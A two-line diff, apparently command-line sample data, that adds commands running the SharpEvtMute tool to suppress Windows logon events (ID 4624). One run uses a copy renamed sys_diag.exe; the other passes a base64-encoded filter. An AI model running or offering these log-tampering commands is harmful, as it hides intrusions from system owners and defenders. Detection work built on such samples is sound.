@@ -1,0 +1,2 @@
+copy SharpEvtMute.exe sys_diag.exe && sys_diag.exe -f "rule name { eventid == 4624 }"
+SharpEvtMute.exe -e "cnVsZSBuYW1lIHsgZXZlbnRpZCA9PSA0NjI0IH0="
